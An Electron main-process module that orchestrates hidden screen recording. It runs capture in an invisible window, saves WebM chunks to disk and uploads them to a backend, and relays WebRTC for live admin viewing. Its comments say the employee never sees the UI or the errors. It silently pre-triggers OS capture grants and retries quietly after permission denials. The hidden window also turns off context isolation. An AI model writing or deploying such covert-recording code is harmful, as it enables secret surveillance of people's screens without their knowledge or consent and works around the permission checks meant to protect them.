/**
 * recorder-main.js — Recording Orchestrator (Main Process)
 * Manages the hidden BrowserWindow, chunk I/O, and chunk upload queue.
 */
import electronPkg from 'electron';
const { BrowserWindow, desktopCapturer, ipcMain, app } = electronPkg;
import path from 'path';
import fs from 'fs';
import { fileURLToPath } from 'url';
import { logger } from './logger.js';
import { RECORDING_CHUNK_ENDPOINT, CHUNK_RETRY_CONFIG, DEFAULT_QUALITY, RECORDING_CHUNK_INTERVAL_MS } from './config.js';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

let _recorderWindow = null;
let _state = 'idle'; // idle | starting | recording | stopping | permission_denied
let _sessionId = null;
let _uploadQueue = [];
let _isUploading = false;
let _onStateChange = null;
let _getToken = null;
let _listenersReady = false;
let _warmupDone = false;
let _startRetries = 0;
const MAX_START_RETRIES = 3;

// ─── Init ─────────────────────────────────
export function initRecorderMain(getToken, onStateChange) {
  _getToken = getToken;
  _onStateChange = onStateChange;
  if (_listenersReady) return;
  _listenersReady = true;

  ipcMain.on('recording:chunk', (_e, { sessionId, chunkIndex, buffer }) => {
    _handleChunk(sessionId, chunkIndex, Buffer.from(buffer));
  });

  ipcMain.on('recording:state', (_e, { state, sessionId }) => {
    logger.info(`[Recorder] State → ${state} (session: ${sessionId})`);
    if (state === 'recording') {
      _state = 'recording';
      _startRetries = 0; // success — reset silent retry budget
    } else {
      _state = 'idle';
    }
    if (_onStateChange) _onStateChange(state, sessionId);
  });

  ipcMain.on('recording:error', (_e, { code, message, sessionId }) => {
    const sid = sessionId || _sessionId;
    const isPermission = code === 'PERMISSION_DENIED';
    logger.error(`[Recorder] Error [${code}]: ${message} (session: ${sid})`);

    // Silent retry — never show UI to the end user
    if (isPermission && sid && _startRetries < MAX_START_RETRIES) {
      _startRetries++;
      const delay = 2000 * _startRetries;
      logger.warn(`[Recorder] Permission error — silent retry ${_startRetries}/${MAX_START_RETRIES} in ${delay}ms`);
      _state = 'starting';
      if (_onStateChange) _onStateChange('starting', sid);
      setTimeout(() => {
        startRecording(sid).catch((err) => {
          logger.error(`[Recorder] Silent retry failed: ${err.message}`);
        });
      }, delay);
      return;
    }

    _state = isPermission ? 'permission_denied' : 'idle';
    if (_onStateChange) _onStateChange(isPermission ? 'permission_denied' : 'error', sid);

    // Forward to backend so the admin dashboard can see it (employee never sees this)
    _forwardErrorToGateway({
      type: 'ERROR',
      code: code || 'START_FAILED',
      message: message || 'Recording failed',
      sessionId: sid ?? undefined,
    });
  });

  ipcMain.on('recording:warmup-result', (_e, ok) => {
    _warmupDone = !!ok;
    logger.info(`[Recorder] Capture warm-up ${ok ? 'succeeded' : 'failed'}`);
  });

  ipcMain.on('recording:webrtc-out', (_e, msg) => {
    import('./ws-client.js').then(({ sendWsMessage }) => {
      sendWsMessage(msg);
    }).catch(err => logger.error(`[Recorder] WebRTC WS send error: ${err.message}`));
  });

  logger.info('[Recorder Main] Initialized');
}

function _forwardErrorToGateway(msg) {
  import('./ws-client.js').then(({ sendWsMessage }) => {
    sendWsMessage(msg);
  }).catch(err => logger.error(`[Recorder] Gateway error forward failed: ${err.message}`));
}

// ─── Preflight warm-up (no UI) ────────────
/**
 * Silently exercises desktopCapturer + a short getUserMedia capture inside
 * the hidden recorder window so any one-time OS/Chromium grant happens at
 * idle time — not during an admin-initiated live session.
 */
export async function warmupCapture() {
  if (_warmupDone) return true;
  try {
    const sources = await desktopCapturer.getSources({ types: ['screen'] });
    if (!sources?.length) {
      logger.warn('[Recorder] Warm-up: no screen sources');
      return false;
    }
    const win = await _ensureWindow();
    win.webContents.send('recording:warmup', { sourceId: sources[0].id });
    // Result arrives via recording:warmup-result (async)
    return true;
  } catch (err) {
    logger.warn(`[Recorder] Warm-up failed: ${err.message}`);
    return false;
  }
}

// ─── Public API ───────────────────────────
export async function startRecording(sessionId, quality = DEFAULT_QUALITY) {
  if (_state === 'recording') {
    logger.warn(`[Recorder] Already recording ${_sessionId}`);
    return false;
  }
  try {
    // New session id ⇒ fresh retry budget (silent retries keep the same session)
    if (_sessionId !== sessionId) _startRetries = 0;
    _sessionId = sessionId;
    _state = 'starting';
    _ensureSessionDir(sessionId);

    // Ensure capture path is warm before the real start (silent, no UI)
    if (!_warmupDone) {
      await warmupCapture().catch(() => {});
    }

    const sources = await desktopCapturer.getSources({ types: ['screen'] });
    if (!sources?.length) throw new Error('No screen sources found');

    const win = await _ensureWindow();
    win.webContents.send('recording:start', {
      sessionId,
      sourceId: sources[0].id,
      quality,
      chunkIntervalMs: RECORDING_CHUNK_INTERVAL_MS,
    });
    logger.info(`[Recorder] Start sent to renderer — session ${sessionId}`);
    return true;
  } catch (err) {
    logger.error(`[Recorder] Start failed: ${err.message}`);
    _state = 'idle';
    _forwardErrorToGateway({
      type: 'ERROR',
      code: 'START_FAILED',
      message: err.message,
      sessionId,
    });
    if (_onStateChange) _onStateChange('error', sessionId);
    return false;
  }
}

export function stopRecording() {
  if (_state !== 'recording' && _state !== 'starting') return false;
  _state = 'stopping';
  if (_recorderWindow && !_recorderWindow.isDestroyed()) {
    _recorderWindow.webContents.send('recording:stop');
    return true;
  }
  _state = 'idle';
  return false;
}

export function getRecordingState() {
  return { state: _state, sessionId: _sessionId };
}

export async function handleWebRtcMessage(msg) {
  try {
    const win = await _ensureWindow();
    win.webContents.send('recording:webrtc-in', msg);
  } catch (err) {
    logger.error(`[Recorder] Failed to forward WebRTC message to renderer: ${err.message}`);
  }
}

// ─── Hidden BrowserWindow ─────────────────
async function _ensureWindow() {
  if (_recorderWindow && !_recorderWindow.isDestroyed()) return _recorderWindow;

  const htmlPath = app.isPackaged
    ? path.join(app.getAppPath(), 'electron', 'recorder-renderer', 'recorder.html')
    : path.join(__dirname, 'recorder-renderer', 'recorder.html');

  _recorderWindow = new BrowserWindow({
    width: 400, height: 80,
    show: false, skipTaskbar: true, frame: false,
    webPreferences: { nodeIntegration: true, contextIsolation: false, backgroundThrottling: false },
  });

  await _recorderWindow.loadFile(htmlPath);

  _recorderWindow.on('closed', () => {
    logger.warn('[Recorder] Hidden window closed unexpectedly');
    _recorderWindow = null;
    if (_state === 'recording') { _state = 'idle'; if (_onStateChange) _onStateChange('error', _sessionId); }
  });

  logger.info('[Recorder] Hidden BrowserWindow created');
  return _recorderWindow;
}

// ─── Chunk Handling ───────────────────────
function _handleChunk(sessionId, chunkIndex, buffer) {
  if (!buffer || buffer.length === 0) return;
  const filePath = _chunkPath(sessionId, chunkIndex);
  try {
    fs.writeFileSync(filePath, buffer);
    logger.info(`[Recorder] Chunk ${chunkIndex} → disk (${Math.round(buffer.length / 1024)}KB)`);
    _uploadQueue.push({ sessionId, chunkIndex, buffer, attempts: 0 });
    _drainQueue();
  } catch (err) {
    logger.error(`[Recorder] Chunk write failed: ${err.message}`);
  }
}

async function _drainQueue() {
  if (_isUploading || _uploadQueue.length === 0) return;
  _isUploading = true;
  while (_uploadQueue.length > 0) {
    const item = _uploadQueue[0];
    const ok = await _upload(item);
    if (ok) {
      _uploadQueue.shift();
    } else {
      item.attempts++;
      if (item.attempts >= CHUNK_RETRY_CONFIG.maxRetries) {
        logger.error(`[Recorder] Chunk ${item.chunkIndex} permanently failed`);
        _uploadQueue.shift();
      } else {
        const delay = CHUNK_RETRY_CONFIG.baseDelayMs * Math.pow(2, item.attempts - 1);
        await _sleep(delay);
      }
    }
  }
  _isUploading = false;
}

function _upload({ sessionId, chunkIndex, buffer }) {
  return new Promise((resolve) => {
    try {
      const { net } = electronPkg;
      const url = `${RECORDING_CHUNK_ENDPOINT}?sessionId=${encodeURIComponent(sessionId)}&chunkIndex=${chunkIndex}`;
      const req = net.request({ method: 'POST', url });
      req.setHeader('Content-Type', 'application/octet-stream');
      const token = _getToken?.();
      if (token) req.setHeader('Authorization', `Bearer ${token}`);
      req.on('response', (res) => {
        res.on('data', () => { });
        res.on('end', () => resolve(res.statusCode >= 200 && res.statusCode < 300));
      });
      req.on('error', () => resolve(false));
      req.write(buffer);
      req.end();
    } catch { resolve(false); }
  });
}

// ─── Storage Helpers ──────────────────────
function _recordingsDir() {
  return path.join(app.getPath('userData'), 'recordings');
}

function _ensureSessionDir(sid) {
  const d = path.join(_recordingsDir(), sid);
  if (!fs.existsSync(d)) fs.mkdirSync(d, { recursive: true });
  return d;
}

function _chunkPath(sid, idx) {
  return path.join(_ensureSessionDir(sid), `chunk-${String(idx).padStart(5, '0')}.webm`);
}

function _sleep(ms) {
  return new Promise(r => setTimeout(r, ms));
}
